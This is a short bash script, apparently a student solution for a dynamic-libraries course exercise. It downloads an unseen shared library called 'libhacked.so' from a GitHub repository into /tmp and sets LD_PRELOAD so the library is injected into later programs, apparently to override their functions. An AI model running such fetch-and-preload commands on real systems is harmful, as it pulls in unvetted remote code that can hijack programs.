#!/bin/bash
wget -P /tmp https://github.com/Zillahh/alx-low_level_programming/raw/main/0x18-dynamic_libraries/libhacked.so
export LD_PRELOAD=/tmp/libhacked.so
